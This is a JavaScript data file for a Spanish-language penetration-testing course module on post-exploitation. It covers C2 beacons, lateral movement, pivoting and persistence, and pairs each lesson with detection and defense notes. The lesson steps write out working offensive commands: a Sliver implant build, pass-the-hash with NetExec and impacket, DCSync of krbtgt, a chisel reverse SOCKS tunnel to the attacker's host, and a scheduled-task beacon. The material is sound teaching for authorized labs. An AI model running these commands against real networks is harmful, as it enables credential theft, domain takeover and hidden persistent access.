/* N3 · Escritorio 6 — Post-explotación y C2 */
CL.areas.postexp = { id: 'postexp', title: 'Post-explotación y C2', tagline: 'Qué hace un operador cuando ya está dentro: mando y control, movimiento lateral, persistencia y demostrar el impacto sin causar daño.',
intro: `## Post-explotación
«Entrar» es el principio. El valor del ejercicio está en lo que demuestras después: moverte, mantener el acceso y alcanzar el objetivo. Todo **reversible** y documentado: en un ejercicio profesional dejas el entorno como lo encontraste y entregas la lista de todo lo que tocaste.`,
levels: [
{ name: 'Operador', lessons: [
{ id: 'px-01', t: 'Command & Control (C2): cómo funciona y cómo se detecta', min: 65, labs: ['vm'],
  obj: ['Entender el modelo baliza/servidor C2 y sus canales', 'Montar un C2 de laboratorio para ejercicios autorizados', 'Reconocer lo que el C2 deja ver al Blue Team'],
  theory: `Un **C2** (*Command & Control*) es la infraestructura con la que el operador maneja sus accesos. El modelo:

- **Implante / baliza (*beacon*)**: proceso en la máquina comprometida que **llama a casa** cada cierto tiempo (con *jitter* para no ser regular) y ejecuta las tareas que le dejes.
- **Servidor C2**: recibe las balizas y encola tareas (*team server*).
- **Canales**: HTTP/HTTPS, DNS, SMB entre máquinas internas… elegidos para **mimetizarse** con el tráfico normal.
- **Redirectores**: capas intermedias para ocultar el servidor real.

Frameworks de laboratorio/profesionales: **Sliver**, **Mythic**, **Havoc**, **Metasploit**. Se usan **solo** en laboratorio o en ejercicios con contrato. Lo importante aquí es entender el **modelo**, porque es exactamente lo que el N2 te enseñó a cazar (beaconing).`,
  steps: [
    ['Levanta un C2 de laboratorio (Sliver)', 'sliver-server', 'Dentro: `generate --http 192.168.59.1 --save implante` crea un implante para tu objetivo Windows de laboratorio.'],
    ['Lanza el implante en tu objetivo del lab', '', 'Ejecútalo en el Windows de pruebas y espera la sesión en el team server (`sessions`). Ya tienes una baliza bajo tu control, en tu red aislada.'],
    ['Configura sigilo', '', 'Ajusta el intervalo y el *jitter* de la baliza. Mucho jitter y poca frecuencia = más difícil de detectar por regularidad, pero más lento de operar. Es un compromiso.'],
    ['Ahora mírate con ojos de Blue Team', 'zeek -r captura.pcap', 'Captura el tráfico de la baliza y aplícale lo del N2: ¿destaca por regularidad?, ¿por el User-Agent?, ¿por el volumen? Ahí está tu huella.'],
  ],
  defense: 'Detección de C2: análisis de **beaconing** (regularidad pese al jitter), reputación de dominios/IP de destino, inspección TLS (JA3/JA4), proxies que registran todo y EDR que ve el proceso que inicia conexiones raras. Cazar C2 es exactamente la práctica de tráfico del N2.',
  quiz: [['¿Qué es el *jitter* de una baliza C2?', ['Un error de red', 'Variación aleatoria del intervalo para no ser regular', 'Un tipo de cifrado'], 1, 'El jitter rompe la regularidad para dificultar la detección por patrón temporal.'],
         ['¿Dónde aprendiste a cazar justamente este comportamiento?', ['En ningún sitio', 'En la práctica de tráfico del N2 (beaconing)', 'En el BIOS'], 1, 'El beaconing del N2 es la cara defensiva de esta lección.']],
  challenge: 'Monta Sliver en el lab, consigue una sesión en un Windows de pruebas y captura su tráfico. Escribe media página: cómo se ve tu C2 desde el lado defensivo y qué lo detectaría.',
  refs: [['Sliver', 'https://github.com/BishopFox/sliver'], ['Mythic', 'https://github.com/its-a-feature/Mythic'], ['MITRE · Command and Control', 'https://attack.mitre.org/tactics/TA0011/']] },
]},
{ name: 'Experto', lessons: [
{ id: 'px-02', t: 'Movimiento lateral, recolección de credenciales y demostrar el impacto', min: 75, labs: ['vm'],
  obj: ['Moverte entre máquinas con las credenciales/tickets obtenidos', 'Entender pass-the-hash / pass-the-ticket a alto nivel', 'Alcanzar el objetivo y demostrar impacto de forma reversible'],
  theory: `Con credenciales o tickets, el operador se mueve **lateralmente** por el dominio:

| Técnica | Idea | Nota |
|---|---|---|
| **Pass-the-Hash** | Autenticarse con el hash NTLM, sin la contraseña | Falla si solo Kerberos/credential guard |
| **Pass-the-Ticket** | Reutilizar un ticket Kerberos robado | Base del abuso de delegación |
| **Ejecución remota** | WMI, WinRM, PsExec, SMB | Cada una deja una huella distinta |
| **DCSync** | Pedir al DC los hashes del dominio (con privilegios de replicación) | Compromiso total del dominio |

**Demostrar el impacto** es el objetivo, no el daño: leer el fichero señuelo pactado, mostrar acceso a Domain Admin, listar (sin exfiltrar de verdad) los datos sensibles. En un ejercicio profesional **nunca** se cifra, se destruye ni se exfiltra información real: se **demuestra que se podría**.`,
  steps: [
    ['Muévete con lo que tienes', 'netexec smb 192.168.59.0/24 -u admin -H <hash>', 'NetExec/CrackMapExec prueba una credencial o hash por toda la red y te dice dónde eres administrador (`Pwn3d!`).'],
    ['Ejecución remota en el objetivo', 'impacket-wmiexec corp.local/admin@192.168.59.20 -hashes :<hash>', 'WMI o WinRM suelen ser más discretos que PsExec. Elige según el ruido permitido.'],
    ['Compromiso de dominio (DCSync) en el lab', 'impacket-secretsdump corp.local/admin@192.168.59.10 -just-dc-user krbtgt', 'Con privilegios de replicación, el DC te entrega los hashes. En el informe: «se alcanzó control total del dominio».'],
    ['Demuestra y revierte', '', 'Lee el fichero señuelo pactado como prueba. Apunta todo lo tocado (cuentas usadas, tickets, ficheros) para el apartado de limpieza del informe. No dejas puertas traseras.'],
  ],
  defense: 'Contención del movimiento lateral: Credential Guard, LAPS, desactivar NTLM donde se pueda, segmentar y aplicar Tiering (los admins de dominio no inician sesión en puestos), y alertas sobre DCSync (replicación desde un equipo que no es un DC) y uso de PsExec/WMI entre estaciones.',
  quiz: [['En un ejercicio profesional, al "demostrar impacto" tú…', ['Cifras los datos para que se note', 'Demuestras que podrías, sin destruir ni exfiltrar datos reales', 'Borras el dominio'], 1, 'Se demuestra la capacidad de impacto de forma reversible; nunca se causa daño real.'],
         ['DCSync permite…', ['Apagar el antivirus', 'Pedir al DC los hashes del dominio con privilegios de replicación', 'Escanear puertos'], 1, 'Abusa de los derechos de replicación para extraer credenciales del dominio.']],
  challenge: 'En GOAD, encadena desde un usuario normal hasta leer `krbtgt` por DCSync, documentando cada salto. Entrega la "lista de limpieza": todo lo que un operador real tendría que revertir.',
  refs: [['NetExec', 'https://www.netexec.wiki/'], ['The Hacker Recipes · Movement', 'https://www.thehacker.recipes/ad/movement/'], ['MITRE · Lateral Movement', 'https://attack.mitre.org/tactics/TA0008/']] },
]},
{ name: 'Maestría', lessons: [
{ id: 'px-03', t: 'Pivoting y túneles: llegar a redes internas que no te ven', min: 70, labs: ['vm'],
  obj: ['Entender el pivoting: usar una máquina comprometida como puente', 'Montar túneles y proxies SOCKS para alcanzar segmentos internos', 'Hacerlo de forma ordenada y documentada'],
  theory: `Tras comprometer un host en la DMZ, la red **interna** (CORP) no es accesible desde tu Kali… pero sí desde ese host. El **pivoting** convierte la máquina comprometida en un puente.

| Técnica | Idea | Herramienta |
|---|---|---|
| **SSH dinámico** | proxy SOCKS a través de una sesión SSH | \`ssh -D\` |
| **Proxy SOCKS + proxychains** | mandar tus herramientas por el túnel | chisel, ligolo-ng + proxychains |
| **Port forwarding** | exponer un puerto interno en tu lado | chisel, socat |
| **ligolo-ng** | crea una interfaz; usas la red interna casi como local | ligolo-ng (muy cómodo) |

La disciplina: un túnel a la vez, bien etiquetado, y apuntar qué redes alcanzas por cada pivote (para el informe y para la limpieza).`,
  steps: [
    ['Levanta un proxy SOCKS con chisel', './chisel server -p 9001 --reverse   # en Kali', 'En el host comprometido: `./chisel client KALI:9001 R:socks`. Ya tienes un SOCKS hacia la red interna.'],
    ['Manda tus herramientas por el túnel', 'proxychains nmap -sT -Pn 192.168.59.0/24', 'Con proxychains, nmap/netexec/evil-winrm viajan por el pivote y ven la red CORP interna.'],
    ['Alternativa cómoda: ligolo-ng', '', 'ligolo-ng crea una interfaz de red; añades una ruta a la subred interna y la usas casi como si fuera local, sin proxychains.'],
    ['Documenta la topología', '', 'Dibuja: Kali → host DMZ (pivote) → red CORP. Anota qué llegaste a ver por cada salto para el informe y para desmontarlo al final.'],
  ],
  defense: 'Segmentación real (la DMZ no debería enrutar a CORP), microsegmentación, detección de túneles y de SOCKS, egress filtering y alertas sobre un host que de pronto habla con muchas IPs internas. Un pivote es visible si miras el tráfico este-oeste.',
  quiz: [['¿Para qué sirve un proxy SOCKS en el pivoting?', ['Para cifrar el disco', 'Para mandar tus herramientas a través de la máquina comprometida hacia la red interna', 'Para escanear más rápido'], 1, 'El SOCKS enruta tus herramientas por el pivote hasta segmentos que tú no ves directamente.'],
         ['Mejor defensa contra el pivoting DMZ→CORP:', ['Más ancho de banda', 'Segmentar de verdad para que la DMZ no alcance la red interna', 'Cambiar contraseñas'], 1, 'Si la DMZ no enruta a CORP, el pivote no tiene a dónde ir.']],
  challenge: 'En el laboratorio, comprométe un host de la DMZ y pivota hasta enumerar un servicio de CORP que no veías desde Kali. Documenta la topología y la mitigación de segmentación.',
  refs: [['chisel', 'https://github.com/jpillora/chisel'], ['ligolo-ng', 'https://github.com/nicocha30/ligolo-ng'], ['HackTricks · Tunneling', 'https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding']] },
{ id: 'px-04', t: 'Persistencia y su detección: mantener el acceso sin ser el ruidoso', min: 65, labs: ['vm'],
  obj: ['Conocer los mecanismos de persistencia más comunes y su huella', 'Entender el Golden/Silver Ticket a alto nivel', 'Elegir persistencia reversible y documentada en un ejercicio'],
  theory: `La **persistencia** mantiene el acceso si se reinicia o se cambia una contraseña. Cada mecanismo deja una huella concreta (clave para el Blue Team):

| Mecanismo | Dónde | Huella / detección |
|---|---|---|
| Tarea programada | schtasks / cron | 4698 (creación de tarea) |
| Servicio nuevo | Windows services | 7045 (servicio instalado) |
| Clave Run / inicio | registro | Sysmon 13 (registro), autoruns |
| Golden Ticket | TGT forjado con el hash de **krbtgt** | TGT con tiempos raros, cuentas inexistentes |
| Silver Ticket | TGS forjado para un servicio | sin tráfico al DC para ese acceso |

El **Golden Ticket** (forjar TGTs con el hash de krbtgt) da acceso casi eterno al dominio: por eso krbtgt se rota **dos veces** tras un compromiso. En un ejercicio ético la persistencia es **mínima, reversible y documentada**; se entrega para desmontarla.`,
  steps: [
    ['Persistencia reversible en el lab', 'schtasks /create /tn "LabBeacon" /tr "..." /sc minute /mo 30', 'Apúntala en el inventario de artefactos (la verás generar un 4698). En un ejercicio real, acordada con el cliente.'],
    ['Entiende el Golden Ticket', '', 'Con el hash de krbtgt (obtenido por DCSync en px-02) se forjan TGTs arbitrarios. No lo uses para dañar: entiende por qué obliga a rotar krbtgt dos veces.'],
    ['Mírate con ojos de Blue Team', '', 'Cada técnica genera su evento (4698/7045/Sysmon 13). Reaprovecha las detecciones Sigma del N2 para cazarte a ti mismo.'],
    ['Limpia al cerrar', '', 'Elimina tareas, servicios y claves creados; entrega el inventario. El entorno queda como estaba.'],
  ],
  defense: 'Inventario de autoruns, alertas sobre 4698/7045 y cambios de claves de inicio, rotación doble de krbtgt tras un incidente, Protected Users/Credential Guard, y caza proactiva de tickets Kerberos anómalos. La persistencia es ruidosa si registras los sitios correctos.',
  quiz: [['¿Por qué se rota krbtgt DOS veces tras un compromiso?', ['Por costumbre', 'Para invalidar Golden Tickets forjados con el hash anterior', 'Para acelerar el DC'], 1, 'La doble rotación corta los TGTs forjados que dependían del hash previo.'],
         ['Un servicio nuevo instalado como persistencia genera típicamente…', ['Nada', 'El evento 7045', 'Un 404'], 1, '7045 (servicio instalado) es una señal clásica de persistencia.']],
  challenge: 'Instala en el laboratorio dos persistencias (tarea y clave Run), confirma qué eventos generan y escribe para cada una la detección y la forma de revertirla.',
  refs: [['MITRE · Persistence', 'https://attack.mitre.org/tactics/TA0003/'], ['The Hacker Recipes · Kerberos tickets', 'https://www.thehacker.recipes/ad/persistence/'], ['Sysmon modular', 'https://github.com/olafhartong/sysmon-modular']] },
]},
]};
